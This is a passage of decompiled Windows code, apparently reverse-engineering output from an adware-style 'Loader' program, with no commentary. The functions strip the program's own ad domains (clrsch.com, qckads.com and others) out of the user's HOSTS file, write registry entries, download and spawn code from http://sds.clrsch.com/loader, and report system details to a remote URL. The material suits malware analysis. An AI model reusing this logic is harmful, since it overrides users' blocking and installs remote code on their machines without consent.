                     (char)unaff_ESI,in_stack_fffffee4,(BYTE)in_stack_fffffee8,in_stack_fffffeec,
                     in_stack_fffffef0,in_stack_000002c8,in_stack_000006c8);
      }
      FUN_0040cea0(param_1,param_2,param_3,param_6,param_7,param_8);
      Sleep(param_10);
      iVar2 = FUN_00415fa1((int *)0x0);
      uVar4 = extraout_DL_01;
    } while (iVar2 < in_stack_fffffee8);
  }
  FUN_004116e9(param_1,uVar4,s_Loader_004051a0,s_Wait_For_Next_Update_00405740,
               s_Time_for_an_update_check_____004056b8);
  local_4 = 0xffffffff;
  FUN_0041205e((undefined4 *)&stack0xfffffeec);
  *unaff_FS_OFFSET = uStack_c;
  return;
}



void __cdecl
FUN_0040d2f0(int param_1,int param_2,void *param_3,void *param_4,byte *param_5,BYTE *param_6,
            undefined4 param_7,undefined4 param_8,uint param_9,DWORD param_10)

{
  bool bVar1;
  undefined4 uVar2;
  uint uVar3;
  int iVar4;
  undefined uVar5;
  undefined4 extraout_EDX_00;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 *unaff_FS_OFFSET;
  undefined in_stack_000003cc;
  undefined in_stack_fffffbe8;
  undefined in_stack_fffffbec;
  undefined in_stack_fffffbf0;
  char in_stack_fffffbf4;
  undefined in_stack_ffffffcc;
  undefined4 uStack_c;
  undefined *puStack_8;
  undefined4 local_4;
  undefined4 extraout_EDX;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e06b;
  uStack_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_c;
  FUN_0040bd00(&stack0xfffffbe8,param_1);
  bVar1 = false;
  local_4 = 0;
  if ((0x3d < param_9) &&
     (uVar3 = FUN_0041dd90((void *)(param_2 + 0x28),*(byte **)(param_2 + 8),
                           (byte *)(void *)(param_2 + 0x28)), uVar3 != 0)) {
    bVar1 = true;
  }
  iVar4 = FUN_0040bd90((int)&stack0xfffffbe8);
  uVar5 = (undefined)extraout_EDX;
  uVar2 = extraout_EDX;
  while (iVar4 == 0) {
    FUN_004116e9(param_1,(char)uVar2,s_Loader_004051a0,s_Wait_For_Online_004057b8,
                 s_Not_connected_to_the_Internet__s_004057c8);
    FUN_0040cbb0(param_1,param_4,param_5);
    FUN_0041546e(&stack0xfffffbf4,(byte *)s_Current_control_set_version_is___004056d8);
    FUN_004116e9(param_1,(char)&stack0xfffffbf4,s_Loader_004051a0,s_Wait_For_Online_004057b8,
                 &stack0xfffffbf4);
    if (bVar1) {
      FUN_0040ccd0((char)param_1,(char)param_4,(char)unaff_EDI,(char)unaff_EBP,(char)unaff_ESI,
                   (char)unaff_EBX,in_stack_fffffbe8,in_stack_fffffbec,in_stack_fffffbf0,
                   in_stack_fffffbf4,in_stack_ffffffcc,in_stack_000003cc);
    }
    FUN_0040cea0(param_1,param_2,param_3,param_6,param_7,param_8);
    Sleep(param_10);
    iVar4 = FUN_0040bd90((int)&stack0xfffffbe8);
    uVar5 = (undefined)extraout_EDX_00;
    uVar2 = extraout_EDX_00;
  }
  FUN_004116e9(param_1,uVar5,s_Loader_004051a0,s_Wait_For_Online_004057b8,
               s_Connected______exiting__0040579c);
  local_4 = 0xffffffff;
  FUN_0040bd40((undefined4 *)&stack0xfffffbe8);
  *unaff_FS_OFFSET = uStack_c;
  return;
}



void __cdecl
FUN_0040d470(int param_1,int param_2,void *param_3,void *param_4,int param_5,byte *param_6,
            BYTE *param_7,undefined4 param_8,undefined4 param_9,uint param_10,DWORD param_11)

{
  bool bVar1;
  uint uVar2;
  int iVar3;
  undefined extraout_DL;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined in_stack_000003e0;
  undefined in_stack_fffffbfc;
  char in_stack_fffffc00;
  undefined in_stack_fffffc04;
  undefined in_stack_fffffc08;
  undefined in_stack_ffffffe0;
  
  bVar1 = false;
  if ((0x3d < param_10) &&
     (uVar2 = FUN_0041dd90((void *)(param_2 + 0x28),*(byte **)(param_2 + 8),
                           (byte *)(void *)(param_2 + 0x28)), uVar2 != 0)) {
    bVar1 = true;
  }
  iVar3 = FUN_00415fa1((int *)0x0);
  while (iVar3 < param_5) {
    FUN_0040cbb0(param_1,param_4,param_6);
    FUN_0041546e(&stack0xfffffc00,(byte *)s_Current_control_set_version_is___004056d8);
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Delayed_Reporting_Sleep_004057f8,
                 &stack0xfffffc00);
    if (bVar1) {
      FUN_0040ccd0((char)param_1,(char)param_4,(char)unaff_EDI,(char)unaff_ESI,(char)unaff_EBP,
                   (char)unaff_EBX,in_stack_fffffbfc,in_stack_fffffc00,in_stack_fffffc04,
                   in_stack_fffffc08,in_stack_ffffffe0,in_stack_000003e0);
    }
    FUN_0040cea0(param_1,param_2,param_3,param_7,param_8,param_9);
    Sleep(param_11);
    iVar3 = FUN_00415fa1((int *)0x0);
  }
  return;
}



void __cdecl FUN_0040d590(int param_1,DWORD param_2)

{
  undefined uVar1;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_18 [3];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e088;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_0040bd00(local_18,param_1);
  local_4 = 0;
  iVar2 = FUN_0040bd90((int)local_18);
  uVar1 = extraout_DL;
  while (iVar2 == 0) {
    FUN_004116e9(param_1,uVar1,s_Loader_004051a0,s_Wait_For_Online_Initial_Install_00405810,
                 s_Not_connected_to_the_Internet__s_004057c8);
    Sleep(param_2);
    iVar2 = FUN_0040bd90((int)local_18);
    uVar1 = extraout_DL_00;
  }
  FUN_004116e9(param_1,uVar1,s_Loader_004051a0,s_Wait_For_Online_Initial_Install_00405810,
               s_Connected______exiting__0040579c);
  local_4 = 0xffffffff;
  FUN_0040bd40(local_18);
  *unaff_FS_OFFSET = local_c;
  return;
}



undefined4 __cdecl
FUN_0040d640(int param_1,undefined4 param_2,undefined4 param_3,uint **param_4,uint *param_5)

{
  uint uVar1;
  uint *puVar2;
  DWORD DVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined uVar4;
  undefined4 uVar5;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_118 [3];
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e0ab;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_0040bd00(local_118,param_1);
  uVar5 = 0;
  local_4 = 0;
  FUN_0041546e(local_10c,(byte *)s_Installation_status_URL_is___s___004058d8);
  FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Report_Status_004058c8,local_10c);
  DVar3 = FUN_0040be00(local_118,param_2);
  if (DVar3 == 0) {
    DVar3 = FUN_0040be90(local_118,param_3,param_4,param_5);
    if (DVar3 == 0) {
      *(undefined *)((int)*param_4 + *param_5) = 10;
      uVar1 = *param_5;
      *param_5 = uVar1 + 1;
      puVar2 = *param_4;
      *(undefined *)((int)puVar2 + uVar1 + 1) = 0;
      *param_5 = *param_5 + 1;
      FUN_004116e9(param_1,(char)puVar2,s_Loader_004051a0,s_Report_Status_004058c8,
                   s_Response_from_installation_statu_00405880);
      FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Report_Status_004058c8,
                   s__________________________________00405844);
      FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Report_Status_004058c8,*param_4);
      FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Report_Status_004058c8,
                   s__________________________________00405844);
    }
    else {
      FUN_0041546e(local_10c,(byte *)s_Error__d_opening_URL__004058b0);
      FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Report_Status_004058c8,local_10c);
      uVar5 = 0xfffffffe;
    }
    FUN_0040be70((int)local_118);
    uVar4 = extraout_DL_03;
  }
  else {
    FUN_0041546e(local_10c,(byte *)s_Error__d_opening_Internet_connec_00404e70);
    FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Report_Status_004058c8,local_10c);
    uVar5 = 0xffffffff;
    uVar4 = extraout_DL;
  }
  FUN_004116e9(param_1,uVar4,s_Loader_004051a0,s_Report_Status_004058c8,s_Closed_Connection_00405830
              );
  local_4 = 0xffffffff;
  FUN_0040bd40(local_118);
  *unaff_FS_OFFSET = local_c;
  return uVar5;
}



void __cdecl FUN_0040d810(int param_1,int param_2)

{
  byte bVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int **ppiVar4;
  uint *puVar5;
  uint *puVar6;
  uint *puVar7;
  uint *puVar8;
  uint *puVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint *puVar13;
  uint *puVar14;
  uint *puVar15;
  uint *puVar16;
  uint *puVar17;
  uint *puVar18;
  uint *puVar19;
  int **ppiVar20;
  uint uVar21;
  uint uVar22;
  void *this;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined uVar23;
  undefined extraout_DL_06;
  undefined4 extraout_EDX;
  undefined4 uVar24;
  undefined4 extraout_EDX_00;
  undefined4 *puVar25;
  byte *pbVar26;
  byte *pbVar27;
  undefined4 *puVar28;
  char *pcVar29;
  char local_700;
  char local_600 [256];
  undefined4 local_500;
  undefined local_4fb;
  char local_400 [1024];
  
  pbVar2 = *(byte **)(param_2 + 8);
  uVar21 = 0xffffffff;
  pbVar26 = pbVar2;
  do {
    pbVar27 = pbVar26;
    if (uVar21 == 0) break;
    uVar21 = uVar21 - 1;
    pbVar27 = pbVar26 + 1;
    bVar1 = *pbVar26;
    pbVar26 = pbVar27;
  } while (bVar1 != 0);
  uVar21 = ~uVar21;
  puVar25 = (undefined4 *)(pbVar27 + -uVar21);
  puVar28 = &local_500;
  for (uVar22 = uVar21 >> 2; uVar22 != 0; uVar22 = uVar22 - 1) {
    *puVar28 = *puVar25;
    puVar25 = puVar25 + 1;
    puVar28 = puVar28 + 1;
  }
  for (uVar21 = uVar21 & 3; uVar21 != 0; uVar21 = uVar21 - 1) {
    *(undefined *)puVar28 = *(undefined *)puVar25;
    puVar25 = (undefined4 *)((int)puVar25 + 1);
    puVar28 = (undefined4 *)((int)puVar28 + 1);
  }
  local_4fb = 0;
  uVar21 = FUN_0041dd90((void *)0x0,pbVar2,(byte *)s_windows_nt_00405b30);
  if (((uVar21 == 0) ||
      (uVar21 = FUN_0041dd90(*(void **)(param_2 + 8),(byte *)*(void **)(param_2 + 8),
                             (byte *)s_windows_2000_00405b20), uVar21 == 0)) ||
     (uVar21 = FUN_0041dd90(this,(byte *)&local_500,(byte *)s_winnt_00405b18), uVar21 == 0)) {
    pcVar29 = s__s_system32_drivers_etc_hosts_00405aec;
  }
  else {
    pcVar29 = s__s_hosts_00405b0c;
  }
  FUN_0041546e(local_400,(byte *)pcVar29);
  FUN_0041546e(local_600,(byte *)s_Modifying_HOSTS_file___s___00405ad0);
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,local_600);
  ppbVar3 = (byte **)FUN_004154e0(local_400,&DAT_00405ab8);
  if (ppbVar3 == (byte **)0x0) {
    FUN_0041546e(local_600,(byte *)s_HOSTS_file___s__NOT_found__nothi_00405a8c);
    FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,local_600);
    uVar23 = extraout_DL_01;
  }
  else {
    ppiVar4 = (int **)FUN_004161f1();
    FUN_0041546e(local_600,(byte *)s_HOSTS_file___s__found__reading_f_00405a64);
    FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,local_600);
    while (FUN_0041619a(&local_700,0x100,ppbVar3), (*(byte *)(ppbVar3 + 3) & 0x10) == 0) {
      if (local_700 == '#') {
        FUN_00416157((uint *)&local_700,ppiVar4);
      }
      else {
        FUN_004160b9((uint *)&local_700);
        puVar5 = FUN_00415a80((uint *)&local_700,s_auto_search_msn_com_00405a50);
        puVar6 = FUN_00415a80((uint *)&local_700,s_search_netscape_com_00405a3c);
        puVar7 = FUN_00415a80((uint *)&local_700,s_ieautosearch_00405a2c);
        puVar8 = FUN_00415a80((uint *)&local_700,s_clrsch_net_00405a20);
        puVar9 = FUN_00415a80((uint *)&local_700,s_clr_sch_com_00405a14);
        puVar10 = FUN_00415a80((uint *)&local_700,s_clearsearch_com_00405a04);
        puVar11 = FUN_00415a80((uint *)&local_700,s_clrsch_com_004059f8);
        puVar12 = FUN_00415a80((uint *)&local_700,s_qckads_com_004059ec);
        puVar13 = FUN_00415a80((uint *)&local_700,s_clear_search_com_004059d8);
        puVar14 = FUN_00415a80((uint *)&local_700,s_dat22_com_004059cc);
        puVar15 = FUN_00415a80((uint *)&local_700,s_get02_com_004059c0);
        puVar16 = FUN_00415a80((uint *)&local_700,s_chksvc_com_004059b4);
        puVar17 = FUN_00415a80((uint *)&local_700,s_svcmgr_com_004059a8);
        puVar18 = FUN_00415a80((uint *)&local_700,s_chkdat_com_0040599c);
        puVar19 = FUN_00415a80((uint *)&local_700,s_phishing_net_0040598c);
        if ((puVar19 == (uint *)0x0) &&
           (puVar18 == (uint *)0x0 &&
            (puVar17 == (uint *)0x0 &&
            (puVar16 == (uint *)0x0 &&
            (puVar15 == (uint *)0x0 &&
            (puVar14 == (uint *)0x0 &&
            (puVar13 == (uint *)0x0 &&
            (puVar12 == (uint *)0x0 &&
            (puVar11 == (uint *)0x0 &&
            (puVar10 == (uint *)0x0 &&
            (puVar9 == (uint *)0x0 &&
            (puVar8 == (uint *)0x0 &&
            (puVar7 == (uint *)0x0 && (puVar6 == (uint *)0x0 && puVar5 == (uint *)0x0))))))))))))))
        {
          FUN_00416157((uint *)&local_700,ppiVar4);
        }
      }
    }
    FUN_004150d8((int *)ppbVar3);
    FUN_004153e2((char **)ppiVar4,0,0);
    ppiVar20 = (int **)FUN_004154e0(local_400,&DAT_00405158);
    if (ppiVar20 == (int **)0x0) {
      FUN_0041546e(local_600,(byte *)s_Error_opening_the_HOSTS_file___s_0040595c);
      pcVar29 = local_600;
      uVar23 = extraout_DL_03;
    }
    else {
      FUN_0041546e(local_600,(byte *)s_Overwriting_HOSTS_file___s___0040593c);
      FUN_004116e9(param_1,extraout_DL_04,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,local_600);
      pcVar29 = s__________________________________0040590c;
      uVar24 = extraout_EDX;
      while( true ) {
        FUN_004116e9(param_1,(char)uVar24,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,pcVar29);
        FUN_0041619a(&local_700,0x100,(byte **)ppiVar4);
        if ((*(byte *)(ppiVar4 + 3) & 0x10) != 0) break;
        FUN_00416157((uint *)&local_700,ppiVar20);
        pcVar29 = &local_700;
        uVar24 = extraout_EDX_00;
      }
      FUN_004150d8((int *)ppiVar20);
      pcVar29 = s__________________________________0040590c;
      uVar23 = extraout_DL_05;
    }
    FUN_004116e9(param_1,uVar23,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,pcVar29);
    FUN_0041607d();
    uVar23 = extraout_DL_06;
  }
  FUN_004116e9(param_1,uVar23,s_Loader_004051a0,s_Repair_Hosts_File_00405abc,s_completed__004058fc);
  return;
}



uint __cdecl
FUN_0040dc70(undefined4 param_1,int param_2,undefined4 param_3,undefined param_4,undefined param_5,
            undefined param_6,undefined param_7,undefined param_8,undefined param_9,
            undefined param_10,undefined param_11,undefined param_12,undefined param_13)

{
  bool bVar1;
  bool bVar2;
  int iVar3;
  uint uVar4;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  undefined4 uVar5;
  undefined3 extraout_var_01;
  uint uVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  uint *unaff_FS_OFFSET;
  undefined1 in_stack_000000dc;
  undefined in_stack_0000011c;
  undefined in_stack_000004f4;
  undefined in_stack_00000534;
  uint in_stack_0000115c;
  int in_stack_0000116c;
  undefined4 in_stack_00001170;
  int in_stack_00001174;
  undefined uVar7;
  undefined uVar8;
  undefined uVar9;
  undefined uVar10;
  undefined uVar11;
  uint uVar12;
  BYTE BVar13;
  int iVar14;
  
  uVar6 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (uint)&stack0xfffffff4;
  FUN_00415a50((char)uVar6);
  FUN_00412030(&stack0x00000000,in_stack_0000116c);
  uVar12 = 0;
  iVar14 = 0;
  FUN_00409f90(&param_4,in_stack_0000116c);
  param_2 = 0;
  uVar6 = uVar6 & 0xffffff;
  bVar2 = false;
  param_3 = 0;
  iVar3 = FUN_004123b0(&stack0x00000000,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,
                       (LPBYTE)&param_3);
  if (iVar3 == 0) {
    FUN_00412722(&stack0x00000000,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648);
  }
  iVar3 = FUN_004132f2(in_stack_0000116c,*(LPCSTR *)(in_stack_00001174 + 0x1c));
  if (iVar3 == 0) {
    FUN_004141d9(in_stack_0000116c,*(LPCSTR *)(in_stack_00001174 + 0x1c));
  }
  iVar3 = FUN_004132f2(in_stack_0000116c,*(LPCSTR *)(in_stack_00001174 + 0x1c));
  if (iVar3 != 0) {
    FUN_0041546e(&param_12,(byte *)s__s__s_0040460c);
    iVar3 = FUN_004132f2(in_stack_0000116c,&param_12);
    if ((iVar3 == 0) && (iVar3 = FUN_004141d9(in_stack_0000116c,&param_12), iVar3 != 0)) {
      uVar12 = 4;
    }
  }
  uVar4 = FUN_004124c2(&stack0x00000000,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042324c,&param_12);
  FUN_004123b0(&stack0x00000000,(HKEY)0x80000002,&DAT_00421e4c,&DAT_00420a4c,&stack0xfffffffc);
  FUN_0041546e(&param_11,(byte *)s_nInstalledLoaderVersion____d__00405c1c);
  FUN_004116e9(in_stack_0000116c,extraout_DL,s_Loader_004051a0,
               s_Initial_Software_Installation_00405bfc,&param_11);
  FUN_0041546e(&param_13,(byte *)s__s__s_0040460c);
  if (iVar14 < 0xf) {
    do {
      uVar11 = (undefined)uVar6;
      BVar13 = (BYTE)iVar14;
      uVar10 = (undefined)unaff_EBX;
      uVar9 = (undefined)unaff_EBP;
      uVar8 = (undefined)unaff_ESI;
      uVar7 = (undefined)unaff_EDI;
      if (bVar2) break;
      iVar3 = FUN_00411f30(&param_10,&DAT_00420e4c);
      if (0 < iVar3) {
        do {
          FUN_00411ee0(&param_10,&DAT_00420e4c);
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
      }
      FUN_0041546e(&param_11,(byte *)s_Detected_Loader_version__d_insta_00405bb8);
      FUN_004116e9(in_stack_0000116c,(char)&param_11,s_Loader_004051a0,
                   s_Initial_Software_Installation_00405bfc,&param_11);
      bVar1 = FUN_00414270(in_stack_0000116c,DAT_004251cc,&param_13);
      uVar4 = CONCAT31(extraout_var,bVar1);
      if (uVar4 == 0) {
        FUN_00414601(in_stack_0000116c,&param_13,(byte **)&DAT_0040503c);
        uVar6 = CONCAT13(1,(int3)uVar6);
        bVar2 = true;
      }
      else {
        uVar12 = uVar12 | 1;
      }
      uVar11 = (undefined)uVar6;
      BVar13 = (BYTE)iVar14;
      uVar10 = (undefined)unaff_EBX;
      uVar9 = (undefined)unaff_EBP;
      uVar8 = (undefined)unaff_ESI;
      uVar7 = (undefined)unaff_EDI;
      param_2 = param_2 + 1;
    } while (param_2 < 5);
    bVar2 = FUN_00412065(&stack0x00000000,(HKEY)0x80000002,
                         s_SOFTWARE_Microsoft_Windows_Curre_00405418);
    if (CONCAT31(extraout_var_00,bVar2) == 0) {
      FUN_00412966(&stack0x00000000,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_00405418);
    }
    uVar5 = FUN_00415fa1((int *)0x0);
    FUN_004125fb(&stack0x00000000,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e248,uVar5);
    FUN_0041546e(&stack0x0000095c,(byte *)s__s__s__s_004053b4);
    bVar2 = FUN_00413399(in_stack_0000116c,&stack0x0000095c);
    if (CONCAT31(extraout_var_01,bVar2) == 0) {
      FUN_0041546e(&param_11,(byte *)s_Retrieving_latest_control_set_fr_00405b6c);
      FUN_004116e9(in_stack_0000116c,extraout_DL_00,s_Loader_004051a0,
                   s_Initial_Software_Installation_00405bfc,&param_11);
      uVar4 = FUN_0040b260(&param_4,in_stack_00001170,s_http___sds_clrsch_com_loader_00405b98);
      if (uVar4 == 0) {
        uVar6 = FUN_0040af60((char)in_stack_00001170,0x98,(char)&param_12,uVar7,uVar8,uVar9,uVar10,
                             uVar11,(char)uVar12,BVar13,param_7,in_stack_0000011c,in_stack_00000534)
        ;
        if (uVar6 != 0) {
          uVar12 = uVar12 | 0x20;
        }
        uVar4 = FUN_0040b5d0((char)&param_12,0x4c,0x4c,0x4c,uVar7,uVar8,uVar9,uVar10,uVar11,
                             (char)uVar12,in_stack_000000dc,in_stack_000004f4);
        if (uVar4 != 0) {
          uVar12 = uVar12 | 0x40;
        }
      }
      else {
        uVar12 = uVar12 | 0x10;
      }
    }
    if ((uVar4 & 1) == 0) {
      FUN_0041546e(&stack0x00000d5c,(byte *)s___d__s_00405b64);
      FUN_0041546e(&param_11,(byte *)s_Spawning__s_00405b54);
      FUN_004116e9(in_stack_0000116c,(char)&param_11,s_Loader_004051a0,
                   s_Initial_Software_Installation_00405bfc,&param_11);
      FUN_00415e87(1,(uint *)&param_13);
      FUN_004116e9(in_stack_0000116c,extraout_DL_01,s_Loader_004051a0,
                   s_Initial_Software_Installation_00405bfc,s_Returned_from_spawn__00405b3c);
    }
  }
  else {
    FUN_0041546e(&param_11,(byte *)s_Spawning__s_00405b54);
    FUN_004116e9(in_stack_0000116c,extraout_DL_02,s_Loader_004051a0,
                 s_Initial_Software_Installation_00405bfc,&param_11);
    FUN_00415e87(1,(uint *)&param_13);
  }
  FUN_00411af0((undefined4 *)&param_10);
  FUN_00409fd0((undefined4 *)&param_4);
  FUN_0041205e((undefined4 *)&stack0x00000000);
  *unaff_FS_OFFSET = in_stack_0000115c;
  return uVar12;
}



uint __cdecl FUN_0040e140(int param_1,undefined4 param_2)

{
  char cVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  undefined extraout_DL;
  uint uVar5;
  uint uVar6;
  undefined4 *puVar7;
  char *pcVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 *puVar11;
  undefined4 *unaff_FS_OFFSET;
  undefined4 *in_stack_00000024;
  uint local_a38;
  uint *local_a34;
  uint local_a30;
  undefined4 local_a2c [2];
  undefined4 local_a24 [4];
  uint local_a14;
  char local_a0c [256];
  char local_90c [256];
  char local_80c [1024];
  char local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e106;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_a2c,param_1);
  uVar6 = 0;
  uVar5 = 0;
  local_4 = 0;
  local_a38 = 0;
  FUN_00409f90(local_a24,param_1);
  local_4 = CONCAT31(local_4._1_3_,1);
  local_a34 = (uint *)0x0;
  local_a30 = 0x1000;
  iVar2 = FUN_004124c2(local_a2c,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_0040564c,
                       (LPCSTR)&DAT_00422e4c,DAT_004251cc);
  if (iVar2 != 0) {
    local_a38 = 2;
    uVar5 = 2;
  }
  FUN_0041546e(local_80c,(byte *)s__s__s_0040460c);
  FUN_0040aaf0(local_80c,0x41ee4c,(uint *)&DAT_00422a4c);
  FUN_0041546e(local_a0c,(byte *)s_Loading_control_set_returned__d__00405d44);
  FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,s_Secondary_Software_Installation_00405d24,
               local_a0c);
  FUN_0040a9a0((int)local_a24,extraout_DL,local_80c);
  FUN_0041546e(local_a0c,(byte *)s_Verifying_control_set_returned___00405d00);
  FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,s_Secondary_Software_Installation_00405d24,
               local_a0c);
  iVar2 = FUN_0040a7e0(local_a24,local_80c,&DAT_0041ee4c,&DAT_0042064c);
  if (iVar2 != 0) {
    uVar5 = uVar5 | 0x80;
    local_a38 = uVar5;
  }
  FUN_0041546e(local_a0c,(byte *)s_Processing_control_set_returned___00405cd8);
  FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,s_Secondary_Software_Installation_00405d24,
               local_a0c);
  FUN_0041546e(local_40c,(byte *)s__s_OS__s_DSPW__d_DSPH__d_ADMIN_1_00405c50);
  if (local_a14 != 0) {
    do {
      FUN_0041546e(local_90c,(byte *)s___s__d_00405c48);
      uVar5 = 0xffffffff;
      pcVar9 = local_90c;
      do {
        pcVar8 = pcVar9;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar8 = pcVar9 + 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar8;
      } while (cVar1 != '\0');
      uVar5 = ~uVar5;
      iVar2 = -1;
      pcVar9 = local_40c;
      do {
        pcVar10 = pcVar9;
        if (iVar2 == 0) break;
        iVar2 = iVar2 + -1;
        pcVar10 = pcVar9 + 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar10;
      } while (cVar1 != '\0');
      puVar7 = (undefined4 *)(pcVar8 + -uVar5);
      puVar11 = (undefined4 *)(pcVar10 + -1);
      for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *puVar11 = *puVar7;
        puVar7 = puVar7 + 1;
        puVar11 = puVar11 + 1;
      }
      uVar6 = uVar6 + 1;
      for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *(undefined *)puVar11 = *(undefined *)puVar7;
        puVar7 = (undefined4 *)((int)puVar7 + 1);
        puVar11 = (undefined4 *)((int)puVar11 + 1);
      }
      uVar5 = local_a38;
    } while (uVar6 < local_a14);
  }
  iVar2 = FUN_0040d640(param_1,param_2,local_40c,&local_a34,&local_a30);
  if (iVar2 == 0) {
    puVar3 = FUN_00415a80(local_a34,s_<InstallID__00405c3c);
    if (puVar3 != (uint *)0x0) {
      uVar6 = 0xffffffff;
      pcVar9 = s_<InstallID__00405c3c;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      FUN_004154f3((uint *)((int)puVar3 + (~uVar6 - 1)),&DAT_004042f8);
      FUN_004125fb(local_a2c,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,*in_stack_00000024);
    }
    if (local_a34 != (uint *)0x0) {
      FUN_004150a9(local_a34);
    }
  }
  local_4 = local_4 & 0xffffff00;
  FUN_00409fd0(local_a24);
  local_4 = 0xffffffff;
  FUN_0041205e(local_a2c);
  *unaff_FS_OFFSET = local_c;
  return uVar5;
}



undefined4 __cdecl
FUN_0040e460(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5
            ,undefined4 param_6)

{
  char cVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  uint uVar6;
  undefined4 *puVar7;
  char *pcVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 *puVar11;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_a38 [2];
  undefined4 local_a30 [2];
  int local_a28;
  uint local_a20;
  uint local_a18;
  uint *local_a14;
  int local_a10;
  char local_a0c [256];
  char local_90c [256];
  char local_80c [1024];
  char local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e126;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_a38,param_1);
  local_4 = 0;
  FUN_00409f90(local_a30,param_1);
  local_4._0_1_ = 1;
  local_a18 = 0x1000;
  FUN_004123b0(local_a38,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042064c,(LPBYTE)&local_a10);
  FUN_0041546e(local_80c,(byte *)s__s__s_0040460c);
  iVar2 = FUN_0040aaf0(local_80c,0x41ee4c,(uint *)&DAT_00422a4c);
  FUN_0041546e(local_a0c,(byte *)s_Loading_control_set_returned__d__00405d44);
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Execute_Local_ControlSet_00405dc0,local_a0c);
  if (iVar2 == 0) {
    FUN_0040a9a0((int)local_a30,extraout_DL_00,local_80c);
    FUN_0041546e(local_a0c,(byte *)s_Verifying_control_set_returned___00405d00);
    FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Execute_Local_ControlSet_00405dc0,
                 local_a0c);
    iVar2 = FUN_0040a7e0(local_a30,local_80c,&DAT_0041ee4c,&DAT_0042064c);
    FUN_0041546e(local_a0c,(byte *)s_Processing_control_set_returned___00405cd8);
    FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Execute_Local_ControlSet_00405dc0,
